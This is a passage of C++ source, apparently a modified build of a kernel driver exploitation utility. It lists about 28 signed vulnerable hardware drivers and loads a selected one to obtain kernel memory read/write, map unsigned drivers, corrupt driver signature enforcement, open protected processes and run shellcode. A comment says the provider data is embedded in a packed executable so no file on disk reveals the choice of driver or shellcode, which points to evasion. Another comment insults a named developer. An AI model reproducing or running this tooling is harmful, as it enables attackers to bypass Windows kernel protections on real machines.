/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2026
*
*  TITLE:       KDUPROV.CPP
*
*  VERSION:     1.47
*
*  DATE:        25 Mar 2026
*
*  Vulnerable drivers provider abstraction layer.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "kduplist.h"

PKDU_DB gProvTable = NULL;

//
// Public (CLI) provider id -> internal KDU_PROVIDER_* id.
//
// Public id 1 lives at index 0, public id N lives at index N-1. Keep
// in sync with the table comment in consts.h.
//
static const ULONG g_KDUPublicIdTable[] = {
    KDU_PROVIDER_ENETECHIO64B,     //  1 -> 11  EneTechIo64
    KDU_PROVIDER_DBUTILDRV2,       //  2 -> 20  DBUtilDrv2
    KDU_PROVIDER_ZEMANA,           //  3 -> 25  amsdk
    KDU_PROVIDER_INPOUTX64,        //  4 -> 26  inpoutx64
    KDU_PROVIDER_PASSMARK_OSF,     //  5 -> 27  DirectIo64
    KDU_PROVIDER_ASROCK,           //  6 -> 28  AsrDrv106
    KDU_PROVIDER_ALCPU,            //  7 -> 29  ALSysIO64
    KDU_PROVIDER_AMD_RYZENMASTER,  //  8 -> 30  AMDRyzenMasterDriver
    KDU_PROVIDER_DELL_PCDOC,       //  9 -> 33  pcdsrvc_x64
    KDU_PROVIDER_MSI_WINIO,        // 10 -> 34  winio
    KDU_PROVIDER_KEXPLORE,         // 11 -> 36  KExplore
    KDU_PROVIDER_NVOCLOCK,         // 12 -> 40  nvoclock
    KDU_PROVIDER_PHYDMACC,         // 13 -> 42  PhyDMACC
    KDU_PROVIDER_RAZER,            // 14 -> 43  rzpnk
    KDU_PROVIDER_AMD_PDFWKRNL,     // 15 -> 44  PdFwKrnl
    KDU_PROVIDER_AMD_AOD215,       // 16 -> 45  AODDriver
    KDU_PROVIDER_WINCOR,           // 17 -> 46  wnBios64
    KDU_PROVIDER_EVGA_ELEETX1,     // 18 -> 47  EleetX1
    KDU_PROVIDER_ASROCK2,          // 19 -> 48  AxtuDrv
    KDU_PROVIDER_ASROCK3,          // 20 -> 49  AppShopDrv103
    KDU_PROVIDER_ASROCK4,          // 21 -> 50  AsrDrv107n
    KDU_PROVIDER_ASROCK5,          // 22 -> 51  AsrDrv107
    KDU_PROVIDER_INTEL_PMXDRV,     // 23 -> 52  PmxDrv
    KDU_PROVIDER_HWRWDRVX64,       // 24 -> 53  HwRwDrv
    KDU_PROVIDER_NEACSAFE64,       // 25 -> 54  NeacSafe64
    KDU_PROVIDER_TPUP,             // 26 -> 55  ThrottleStop
    KDU_PROVIDER_TOSHIBA,          // 27 -> 56  TPwSav
    KDU_PROVIDER_LENOVOMSRIO       // 28 -> 57  LnvMSRIO
};

C_ASSERT(RTL_NUMBER_OF(g_KDUPublicIdTable) == KDU_PUBLIC_ID_MAX);

BOOL KDUIsValidPublicId(
    _In_ ULONG PublicId)
{
    return (PublicId >= KDU_PUBLIC_ID_MIN && PublicId <= KDU_PUBLIC_ID_MAX);
}

ULONG KDUPublicIdToInternal(
    _In_ ULONG PublicId)
{
    if (!KDUIsValidPublicId(PublicId))
        return KDU_PROVIDER_DEFAULT;

    return g_KDUPublicIdTable[PublicId - KDU_PUBLIC_ID_MIN];
}

ULONG KDUInternalIdToPublic(
    _In_ ULONG InternalId)
{
    for (ULONG i = 0; i < RTL_NUMBER_OF(g_KDUPublicIdTable); i++) {
        if (g_KDUPublicIdTable[i] == InternalId)
            return KDU_PUBLIC_ID_MIN + i;
    }
    return 0;
}

PKDU_DB_ENTRY KDUProviderToDbEntry(
    _In_ ULONG ProviderId)
{
    if (gProvTable == NULL)
        return NULL;

    ULONG i;

    for (i = 0; i < gProvTable->NumberOfEntries; i++) {
        if (gProvTable->Entries[i].ProviderId == ProviderId)
            return &gProvTable->Entries[i];
    }

    return NULL;
}

/*
* KDUProvDetectHyperV
*
* Purpose:
*
* Detect hyperv presence.
*
*/
VOID KDUProvDetectHyperV(
    VOID
)
{
#define MSFT_HV "Microsoft Hv"
#define MSFT_HV_SIZE sizeof(MSFT_HV) - sizeof(CHAR)
#define HV_VENDOR_MAX 12

    ULONG returnLength = 0;
    SYSTEM_HYPERVISOR_DETAIL_INFORMATION hdi;
    PHV_VENDOR_AND_MAX_FUNCTION pvi;
    CHAR szVendor[32];

    RtlSecureZeroMemory(&hdi, sizeof(hdi));

    NTSTATUS ntStatus = NtQuerySystemInformation(SystemHypervisorDetailInformation,
        &hdi, sizeof(hdi), &returnLength);

    if (NT_SUCCESS(ntStatus)) {

        pvi = (PHV_VENDOR_AND_MAX_FUNCTION)&hdi.HvVendorAndMaxFunction.Data;

        if (RtlCompareMemory(MSFT_HV, pvi->VendorName, MSFT_HV_SIZE) == MSFT_HV_SIZE) {

            supPrintfEvent(kduEventInformation, "[+] MSFT hypervisor present\r\n");

        }
        else {
            __stosb((PBYTE)&szVendor, 0, sizeof(szVendor));
            RtlCopyMemory(szVendor, pvi->VendorName, HV_VENDOR_MAX);
            supPrintfEvent(kduEventInformation, "[+] The \"%s\" hypervisor present\r\n", szVendor);
        }

    }
    else {

        int CPUInfo[4] = { -1, -1, -1, -1 };

        __cpuid(CPUInfo, 1);
        if ((CPUInfo[2] >> 31) & 1) {
            
            __cpuid(CPUInfo, 0x40000000);
            __stosb((PBYTE)&szVendor, 0, sizeof(szVendor));
            RtlCopyMemory(szVendor, CPUInfo + 1, HV_VENDOR_MAX);
            supPrintfEvent(kduEventInformation, "[+] The \"%s\" hypervisor present\r\n", szVendor);

        }
    }
}

/*
* KDUFirmwareToString
*
* Purpose:
*
* Return human readable firmware name.
*
*/
LPCSTR KDUFirmwareToString(
    _In_ FIRMWARE_TYPE Firmware)
{
    switch (Firmware) {
    case FirmwareTypeBios:
        return "FirmwareTypeBios";
    case FirmwareTypeUefi:
        return "FirmwareTypeUefi";
    case FirmwareTypeUnknown:
    default:
        return "FirmwareTypeUnknown";
    }
}

/*
* KDUProvGetCount
*
* Purpose:
*
* Return count of available providers.
*
*/
ULONG KDUProvGetCount()
{
    return RTL_NUMBER_OF(g_KDUProviders);
}

/*
* KDUReferenceLoadDB
*
* Purpose:
*
* Return pointer to KDU database.
*
*/
PKDU_DB KDUReferenceLoadDB()
{
    return gProvTable;
}

/*
* KDUProvList
*
* Purpose:
*
* Output available providers.
*
*/
VOID KDUProvList()
{
    KDU_DB_ENTRY* provData;
    CONST CHAR* pszDesc;

    HINSTANCE hProv;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    hProv = KDUProviderLoadDB();
    if (hProv == NULL)
        return;

    for (ULONG i = 0; i < gProvTable->NumberOfEntries; i++) {
        provData = &gProvTable->Entries[i];

        ULONG publicId = KDUInternalIdToPublic(provData->ProviderId);

        if (publicId != 0) {
            printf_s("Provider # %lu (internal %lu), ResourceId # %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
                publicId,
                provData->ProviderId,
                provData->ResourceId,
                provData->Description,
                provData->DriverName,
                provData->DeviceName);
        }
        else {
            printf_s("Provider # %lu (no public id), ResourceId # %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
                provData->ProviderId,
                provData->ResourceId,
                provData->Description,
                provData->DriverName,
                provData->DeviceName);
        }

        //
        // Show signer.
        //
        printf_s("\tSigned by: \"%ws\"\r\n",
            provData->SignerName);

        //
        // Shellcode support
        //
        printf_s("\tShellcode support mask: 0x%08x\r\n", provData->SupportedShellFlags);

        //
        // List provider flags.
        //
        if (provData->Flags)
            printf_s("\tProvider capabilities: \r\n");

        if (provData->SignatureWHQL)
            printf_s("\t->Driver is WHQL signed.\r\n");
        //
        // Some Realtek drivers are digitally signed 
        // after binary modification with wrong PE checksum as result.
        // Note: Windows 7 will not allow their load.
        //
        if (provData->IgnoreChecksum)
            printf_s("\t->Ignore invalid image checksum.\r\n");

        //
        // Some BIOS flashing drivers does not support unload.
        //
        if (provData->NoUnloadSupported)
            printf_s("\t->Driver does not support unload procedure.\r\n");

        if (provData->PML4FromLowStub)
            printf_s("\t->Virtual to physical addresses translation require PML4 query from low stub.\r\n");

        if (provData->NoVictim)
            printf_s("\t->No victim required.\r\n");

        if (provData->PhysMemoryBruteForce)
            printf_s("\t->Provider supports only physical memory brute-force.\r\n");

        if (provData->PreferPhysical)
            printf_s("\t->Physical memory access is preferred.\r\n");

        if (provData->PreferVirtual)
            printf_s("\t->Virtual memory access is preferred.\r\n");

        if (provData->CompanionRequired)
            printf_s("\t->Provider expects companion to be loaded.\r\n");

        if (provData->UseSymbols)
            printf_s("\t->MS symbols are required to query internal information.\r\n");

        if (provData->OpenProcessSupported)
            printf_s("\t->Driver can be used to open a handle for the specified process.\r\n");

        if (provData->FsFilter)
            printf_s("\t->Driver is file system filter.\r\n");

        if (provData->UseSuperfetch)
            printf_s("\t->Driver can be used with Superfetch for memory translation.\r\n");

        //
        // List "based" flags.
        //
        if (provData->DrvSourceBase != SourceBaseNone)
        {
            switch (provData->DrvSourceBase) {
            case SourceBaseWinIo:
                pszDesc = WINIO_BASE_DESC;
                break;
            case SourceBaseWinRing0:
                pszDesc = WINRING0_BASE_DESC;
                break;
            case SourceBasePhyMem:
                pszDesc = PHYMEM_BASE_DESC;
                break;
            case SourceBaseMapMem:
                pszDesc = MAPMEM_BASE_DESC;
                break;
            case SourceBaseRWEverything:
                pszDesc = RWEVERYTHING_BASE_DESC;
                break;
            default:
                pszDesc = "Unknown";
                break;
            }

            printf_s("\tBased on: %s\r\n", pszDesc);
        }

        //
        // Minimum support Windows build.
        //
        printf_s("\tMinimum supported Windows build: %lu\r\n",
            provData->MinNtBuildNumberSupport);

        //
        // Maximum support Windows build.
        //
        if (provData->MaxNtBuildNumberSupport == KDU_MAX_NTBUILDNUMBER) {
            printf_s("\tMaximum Windows build undefined, no restrictions\r\n");
        }
        else {
            printf_s("\tMaximum supported Windows build: %lu\r\n",
                provData->MaxNtBuildNumberSupport);
        }

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}

/*
* KDUProvExtractVulnerableDriver
*
* Purpose:
*
* Extract vulnerable driver from resource.
*
*/
BOOL KDUProvExtractVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    ULONG    resourceSize = 0, writeBytes;
    ULONG    uResourceId = Context->Provider->LoadData->ResourceId;
    LPWSTR   lpFullFileName = Context->DriverFileName;
    PBYTE    drvBuffer;

    //
    // Extract driver resource to the file.
    //
    drvBuffer = (PBYTE)KDULoadResource(uResourceId,
        Context->ModuleBase,
        &resourceSize,
        PROVIDER_RES_KEY,
        Context->Provider->LoadData->IgnoreChecksum ? FALSE : TRUE);

    if (drvBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Driver resource id cannot be found %lu\r\n", uResourceId);

        return FALSE;
    }

    printf_s("[+] Extracting vulnerable driver as \"%ws\"\r\n", lpFullFileName);

    writeBytes = (ULONG)supWriteBufferToFile(lpFullFileName,
        drvBuffer,
        resourceSize,
        TRUE,
        FALSE,
        &ntStatus);

    supHeapFree(drvBuffer);

    if (resourceSize != writeBytes) {
        supShowHardError("[!] Unable to extract vulnerable driver", ntStatus);
        return FALSE;
    }

    return TRUE;
}

/*
* KDUProvLoadVulnerableDriver
*
* Purpose:
*
* Load provider vulnerable driver.
*
*/
BOOL KDUProvLoadVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    NTSTATUS ntStatus;

    LPWSTR   lpFullFileName = Context->DriverFileName;
    LPWSTR   lpDriverName = Context->Provider->LoadData->DriverName;


    if (!KDUProvExtractVulnerableDriver(Context))
        return FALSE;

    //
    // Load driver.
    //
    ntStatus = supLoadDriver(lpDriverName, lpFullFileName, FALSE);
    if (NT_SUCCESS(ntStatus)) {
        supPrintfEvent(kduEventInformation,
            "[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);
        bLoaded = TRUE;
    }
    else {

        supShowHardError("[!] Unable to load vulnerable driver", ntStatus);
        DeleteFile(lpFullFileName);
    }

    return bLoaded;
}

/*
* KDUProvIsAlreadyLoaded
*
* Purpose:
*
* Check if provider driver is already loaded by presence of it device object.
*
*/
BOOL KDUProvIsAlreadyLoaded(
    _In_ KDU_CONTEXT* Context
)
{
    LPWSTR lpRootDirectory;
    LPWSTR lpDeviceName = Context->Provider->LoadData->DeviceName;

    switch (Context->Provider->LoadData->ProviderId) {
    case KDU_PROVIDER_DELL_PCDOC:
        lpRootDirectory = (LPWSTR)L"\\GLOBAL??";
        break;
    default:
        lpRootDirectory = (LPWSTR)L"\\Device";
        break;
    }
    return supIsObjectExists(lpRootDirectory, lpDeviceName);
}

/*
* KDUProvStartVulnerableDriver
*
* Purpose:
*
* Load vulnerable driver and return handle for it device or NULL in case of error.
*
*/
BOOL KDUProvStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bLoaded = FALSE;

    //
    // Check if driver already loaded.
    //
    if (KDUProvIsAlreadyLoaded(Context)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        bLoaded = KDUProvLoadVulnerableDriver(Context);

    }

    //
    // If driver loaded then open handle for it and run optional callbacks.
    //
    if (bLoaded) {
        KDUProvOpenVulnerableDriverAndRunCallbacks(Context);
    }

    return (Context->DeviceHandle != NULL);
}

/*
* KDUProvOpenVulnerableDriverAndRunCallbacks
*
* Purpose:
*
* Open handle for vulnerable driver and run optional callbacks if they are defined.
*
*/
void KDUProvOpenVulnerableDriverAndRunCallbacks(
    _In_ KDU_CONTEXT* Context
)
{
    HANDLE deviceHandle = NULL;

    //
    // Run pre-open callback (optional).
    //
    if (Context->Provider->Callbacks.PreOpenDriver) {
        printf_s("[+] Executing pre-open callback for given provider\r\n");
        Context->Provider->Callbacks.PreOpenDriver((PVOID)Context);
    }

    NTSTATUS ntStatus = supOpenDriver(Context->Provider->LoadData->DeviceName,
            SYNCHRONIZE | WRITE_DAC | GENERIC_WRITE | GENERIC_READ,
            &deviceHandle);

    if (!NT_SUCCESS(ntStatus)) {

        supShowHardError("[!] Unable to open vulnerable driver", ntStatus);

    }
    else {

        supPrintfEvent(kduEventInformation,
            "[+] Driver device \"%ws\" has been opened successfully\r\n",
            Context->Provider->LoadData->DriverName);

        Context->DeviceHandle = deviceHandle;

        //
        // Run post-open callback (optional).
        //
        if (Context->Provider->Callbacks.PostOpenDriver) {

            printf_s("[+] Executing post-open callback for given provider\r\n");

            Context->Provider->Callbacks.PostOpenDriver((PVOID)Context);

        }

    }
}

/*
* KDUProvStopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver.
*
*/
void KDUProvStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    LPWSTR lpDriverName = Context->Provider->LoadData->DriverName;
    LPWSTR lpFullFileName = Context->DriverFileName;

    ntStatus = supUnloadDriver(lpDriverName, TRUE);
    if (!NT_SUCCESS(ntStatus)) {

        supShowHardError("[!] Unable to unload vulnerable driver", ntStatus);

    }
    else {

        supPrintfEvent(kduEventInformation,
            "[+] Vulnerable driver \"%ws\" unloaded\r\n",
            lpDriverName);

        if (supDeleteFileWithWait(1000, 5, lpFullFileName))
            printf_s("[+] Vulnerable driver file removed\r\n");

        Context->ProviderState = StateUnloaded;

    }
}

/*
* KDUProviderPostOpen
*
* Purpose:
*
* Provider post-open driver generic callback.
*
*/
BOOL WINAPI KDUProviderPostOpen(
    _In_ PVOID Param
)
{
    KDU_CONTEXT* Context = (KDU_CONTEXT*)Param;
    PSECURITY_DESCRIPTOR driverSD = NULL;

    PACL defaultAcl = NULL;
    HANDLE deviceHandle;

    deviceHandle = Context->DeviceHandle;

    //
    // Check if we need to forcebly set SD.
    //
    if (Context->Provider->LoadData->NoForcedSD == FALSE) {

        //
        // At least make less mess.
        // However if driver author is an idiot just like Unwinder, it won't much help.
        //
        NTSTATUS ntStatus;

        ntStatus = supCreateSystemAdminAccessSD(&driverSD, &defaultAcl);

        if (NT_SUCCESS(ntStatus)) {

            ntStatus = NtSetSecurityObject(deviceHandle,
                DACL_SECURITY_INFORMATION,
                driverSD);

            if (!NT_SUCCESS(ntStatus)) {

                supShowHardError("[!] Unable to set driver device security descriptor", ntStatus);

            }
            else {
                printf_s("[+] Driver device security descriptor set successfully\r\n");
            }

            if (defaultAcl) supHeapFree(defaultAcl);
            supHeapFree(driverSD);

        }
        else {

            supShowHardError("[!] Unable to allocate security descriptor", ntStatus);

        }

    }

    //
    // Remove WRITE_DAC from result handle.
    //
    HANDLE strHandle = NULL;

    if (NT_SUCCESS(NtDuplicateObject(NtCurrentProcess(),
        deviceHandle,
        NtCurrentProcess(),
        &strHandle,
        SYNCHRONIZE | GENERIC_WRITE | GENERIC_READ,
        0,
        0)))
    {
        NtClose(deviceHandle);
        deviceHandle = strHandle;
    }

    Context->DeviceHandle = deviceHandle;

    return (deviceHandle != NULL);
}


/*
* KDUOpenProcess
*
* Purpose:
*
* Provider wrapper for OpenProcess routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUOpenProcess(
    _In_ struct _KDU_CONTEXT* Context,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle
)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    __try {

        bResult = prov->Callbacks.OpenProcess(Context->DeviceHandle,
            ProcessId,
            DesiredAccess,
            ProcessHandle);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUProviderLoadDB
*
* Purpose:
*
* Load drivers database file.
*
*/
//
// Forward declarations of the accessors in drvdb.cpp that expose the
// compiled-in provider table / version. Declared here (private to kduprov.cpp)
// so they don't pollute kduprov.h and the rest of the project stays unaware
// of the drv64.dll -> embedded transition.
//
extern "C" PKDU_DB KDUGetEmbeddedProviderTable(VOID);
extern "C" PKDU_DB_VERSION KDUGetEmbeddedProviderVersion(VOID);

HINSTANCE KDUProviderLoadDB(
    VOID
)
{
    //
    // Embedded-database implementation of what used to be a LoadLibraryEx
    // against the sibling `drv64.dll`. The provider table and version blob
    // are compiled straight into smap_packed.exe (see drvdb.cpp) so there is
    // no DLL on disk to leak our provider choice / shellcode metadata.
    //
    // Returning the mapper's own module handle (used downstream as
    // Context->ModuleBase in KDULoadResource) is correct because the
    // compiled-in provider RCDATA blobs now live in this very module's
    // resource section.
    //

    HINSTANCE hInstance;
    PKDU_DB_VERSION pVersionInfo;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    hInstance = GetModuleHandleW(NULL);
    if (hInstance == NULL) {
        supShowWin32Error("[!] Cannot obtain self module handle", GetLastError());
        FUNCTION_LEAVE_MSG(__FUNCTION__);
        return NULL;
    }

    printf_s("[+] Drivers database (embedded) at 0x%p\r\n", hInstance);

    pVersionInfo = KDUGetEmbeddedProviderVersion();
    if (pVersionInfo == NULL) {
        supPrintfEvent(kduEventError, "[!] Embedded providers version data not found\r\n");
        FUNCTION_LEAVE_MSG(__FUNCTION__);
        return NULL;
    }

    if (pVersionInfo->MajorVersion != KDU_VERSION_MAJOR ||
        pVersionInfo->MinorVersion != KDU_VERSION_MINOR ||
        pVersionInfo->Revision    != KDU_VERSION_REVISION ||
        pVersionInfo->Build       != KDU_VERSION_BUILD)
    {
        //
        // Shouldn't happen when kduprov.cpp and drvdb.cpp are built from the
        // same tree, but we keep the check so a future out-of-tree embed
        // (e.g. a packed build grafted against a mismatched consts.h) still
        // bails loudly instead of running with stale provider metadata.
        //
        supPrintfEvent(kduEventError,
            "[!] Embedded providers database has wrong version, "
            "expected %lu.%lu.%lu.%lu, got %u.%u.%u.%u\r\n",
            KDU_VERSION_MAJOR, KDU_VERSION_MINOR,
            KDU_VERSION_REVISION, KDU_VERSION_BUILD,
            pVersionInfo->MajorVersion, pVersionInfo->MinorVersion,
            pVersionInfo->Revision,    pVersionInfo->Build);

        FUNCTION_LEAVE_MSG(__FUNCTION__);
        return NULL;
    }

    printf_s("[+] Drivers database version is OK\r\n");

    gProvTable = KDUGetEmbeddedProviderTable();
    if (gProvTable == NULL) {
        supPrintfEvent(kduEventError, "[!] Embedded providers table not found\r\n");
        FUNCTION_LEAVE_MSG(__FUNCTION__);
        return NULL;
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
    return hInstance;
}

BOOL KDUpRwHandlersAreSet(
    _In_opt_ PVOID ReadHandler,
    _In_opt_ PVOID WriteHandler
)
{
    if (ReadHandler == NULL ||
        WriteHandler == NULL)
    {

        supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
            "\tKDU interface is not implemented for these methods.\r\n");

        return FALSE;

    }

    return TRUE;
}

/*
* KDUProviderVerifyActionType
*
* Purpose:
*
* Verify key provider functionality.
*
*/
BOOL KDUProviderVerifyActionType(
    _In_ KDU_PROVIDER* Provider,
    _In_ KDU_ACTION_TYPE ActionType)
{
    BOOL bResult = TRUE;
    
#ifdef _DEBUG
    DbgPrint("KDUProviderVerifyActionType bypassed\r\n");
    return TRUE;
#endif

    //
    // Check mixed settings.
    //
    if (Provider->LoadData->PreferPhysical && Provider->LoadData->PreferVirtual) {
        supPrintfEvent(kduEventError,
            "[!] Abort: provider flags PreferPhysical and PreferVirtual cannot be combined\r\n");
        return FALSE;
    }

    switch (ActionType) {
    case ActionTypeDKOM:
    case ActionTypeMapDriver:
    case ActionTypeDSECorruption:

        //
        // Check if we can translate.
        //
        if (Provider->LoadData->PML4FromLowStub && Provider->Callbacks.VirtualToPhysical == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support memory translation or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            return FALSE;
        }

        if (Provider->LoadData->PreferPhysical || Provider->LoadData->PhysMemoryBruteForce) {

            //
            // Driver must have at least something defined.
            //
            BOOL bFirstTry = TRUE, bSecondTry = TRUE;

            if (Provider->Callbacks.ReadPhysicalMemory == NULL ||
                Provider->Callbacks.WritePhysicalMemory == NULL)
            {
                bFirstTry = FALSE;
            }

            if (Provider->Callbacks.ReadKernelVM == NULL ||
                Provider->Callbacks.WriteKernelVM == NULL)
            {
                bSecondTry = FALSE;
            }

            if (bFirstTry == FALSE && bSecondTry == FALSE) {
                supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
                    "\tKDU interface is not implemented for these methods.\r\n");
                return FALSE;
            }

        }

        break;

    case ActionTypeDumpProcess:

        if (Provider->Callbacks.OpenProcess == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary process handle acquisition or\r\n"\
                "\tKDU interface is not implemented for this method.\r\n");
            return FALSE;

        }

        break;

    default:
        break;
    }

    switch (ActionType) {

    case ActionTypeDKOM:

        //
        // Check if we can read/write.
        //

        if (Provider->LoadData->PreferPhysical) {

            if (!KDUpRwHandlersAreSet(
                (PVOID)Provider->Callbacks.ReadPhysicalMemory,
                (PVOID)Provider->Callbacks.WritePhysicalMemory))
            {
                bResult = FALSE;
            }

        }
        else {

            if (!KDUpRwHandlersAreSet(
                (PVOID)Provider->Callbacks.ReadKernelVM,
                (PVOID)Provider->Callbacks.WriteKernelVM))
            {
                bResult = FALSE;
            }

        }

        break;

    case ActionTypeMapDriver:

        //
        // Check if we can map.
        //
        if (Provider->Callbacks.MapDriver == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support driver mapping or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            bResult = FALSE;

        }

        break;

    case ActionTypeDSECorruption:

        //
        // Check if we have DSE control callback set.
        //
        if ((PVOID)Provider->Callbacks.ControlDSE == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider does not support changing DSE values or\r\n"\
                "\tKDU interface is not implemented for this method.\r\n");

            bResult = FALSE;

        }
        break;

    default:
        break;
    }

    return bResult;
}

VOID KDUFallBackOnLoad(
    _Inout_ PKDU_CONTEXT * Context
)
{
    PKDU_CONTEXT ctx = *Context;

    if (ctx->DeviceHandle)
        NtClose(ctx->DeviceHandle);

    if (ctx->Provider->Callbacks.StopVulnerableDriver)
        ctx->Provider->Callbacks.StopVulnerableDriver(ctx);

    if (ctx->DriverFileName)
        supHeapFree(ctx->DriverFileName);

    supHeapFree(ctx);
    *Context = NULL;
}

BOOL KDUIsSupportedShell(
    _In_ ULONG ShellCodeVersion,
    _In_ ULONG ProviderFlags)
{
    ULONG value;
    switch (ShellCodeVersion) {
    case KDU_SHELLCODE_V1:
        value = KDUPROV_SC_V1;
        break;
    case KDU_SHELLCODE_V2:
        value = KDUPROV_SC_V2;
        break;
    case KDU_SHELLCODE_V3:
        value = KDUPROV_SC_V3;
        break;
    case KDU_SHELLCODE_V4:
        value = KDUPROV_SC_V4;
        break;
    default:
        return FALSE;
    }

    return ((ProviderFlags & value) > 0);
}

/*
* KDUProviderCreate
*
* Purpose:
*
* Create Provider to work with it.
*
*/
PKDU_CONTEXT WINAPI KDUProviderCreate(
    _In_ ULONG ProviderId,
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ShellCodeVersion,
    _In_ KDU_ACTION_TYPE ActionType
)
{
    HINSTANCE moduleBase;
    KDU_CONTEXT* Context = NULL;
    KDU_DB_ENTRY* provLoadData = NULL;
    KDU_PROVIDER* prov;
    NTSTATUS ntStatus;

    FIRMWARE_TYPE fmwType;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    do {

        if (ProviderId >= KDUProvGetCount()) {

            supPrintfEvent(kduEventInformation,
                "[+] Provider with id %lu is not supported, will be using default provider (%lu)\r\n",
                ProviderId,
                (ULONG)KDU_PROVIDER_DEFAULT);

            ProviderId = KDU_PROVIDER_DEFAULT;
        }

        //
        // Check HyperV
        //
        KDUProvDetectHyperV();

        //
        // Load drivers DB.
        //
        moduleBase = KDUProviderLoadDB();
        if (moduleBase == NULL) {
            break;
        }

        provLoadData = KDUProviderToDbEntry(ProviderId);
        if (provLoadData == NULL) {
            supPrintfEvent(kduEventError,
                "[!] Requested provider data was not found in database, abort\r\n");
            break;
        }

        prov = &g_KDUProviders[ProviderId];
        prov->LoadData = provLoadData;

        if (ShellCodeVersion != KDU_SHELLCODE_NONE) {
            if (!KDUIsSupportedShell(ShellCodeVersion, provLoadData->SupportedShellFlags)) {
                supPrintfEvent(kduEventError,
                    "[!] Selected shellcode %lu is not supported by this provider (supported mask: 0x%08x), abort\r\n",
                    ShellCodeVersion, provLoadData->SupportedShellFlags);
                break;
            }
        }

        ntStatus = supGetFirmwareType(&fmwType);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Failed to query firmware type", ntStatus);
        }
        else {

            supPrintfEvent(kduEventNone, "[+] Firmware type (%s)\r\n",
                KDUFirmwareToString(fmwType));
            /*
            if (provLoadData->PML4FromLowStub)
                if (fmwType != FirmwareTypeUefi) {

                    supPrintfEvent(kduEventError, "[!] Unsupported PC firmware type for this provider (req: %s, got: %s)\r\n",
                        KDUFirmwareToString(FirmwareTypeUefi),
                        KDUFirmwareToString(fmwType));

                    break;
                }
            */
        }

        //
        // Show provider info.
        //
        supPrintfEvent(kduEventInformation, "[+] Provider: \"%ws\", Name \"%ws\"\r\n",
            provLoadData->Description,
            provLoadData->DriverName);

        //
        // Check HVCI support.
        //
        if (HvciEnabled && provLoadData->SupportHVCI == 0) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider does not support HVCI\r\n");

            break;
        }

        //
        // Check current Windows NT build number.
        //

        if (NtBuildNumber < provLoadData->MinNtBuildNumberSupport) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider require newer Windows NT version\r\n");

            break;
        }

        //
        // Let it burn if they want.
        //

        if (provLoadData->MaxNtBuildNumberSupport != KDU_MAX_NTBUILDNUMBER) {
            if (NtBuildNumber > provLoadData->MaxNtBuildNumberSupport) {

                supPrintfEvent(kduEventError,
                    "[!] Warning: selected provider may not work on this Windows NT version\r\n");

            }
        }

        if (!KDUProviderVerifyActionType(prov, ActionType))
            break;

        ntStatus = supEnablePrivilege(SE_DEBUG_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Abort: SeDebugPrivilege is not assigned!", ntStatus);
            break;
        }

        ntStatus = supEnablePrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Abort: SeLoadDriverPrivilege is not assigned!", ntStatus);
            break;
        }

        if (provLoadData->UseSymbols) {
            if (!symInit()) {
                break;
            }
        }

        //
        // Allocate KDU_CONTEXT structure and fill it with data.
        //
        Context = (KDU_CONTEXT*)supHeapAlloc(sizeof(KDU_CONTEXT));
        if (Context == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Abort: could not allocate provider context\r\n");

            break;
        }

        Context->Provider = prov;

        if (Context->Provider->Callbacks.ValidatePrerequisites)
            if (!Context->Provider->Callbacks.ValidatePrerequisites(Context))
            {
                supHeapFree(Context);
                Context = NULL;

                supPrintfEvent(kduEventError,
                    "[!] Abort: provider prerequisites are not meet\r\n");

                break;
            }

        if (provLoadData->NoVictim) {
            Context->Victim = NULL;
        }
        else {
            if (prov->LoadData->VictimId >= KDU_VICTIM_MAX)
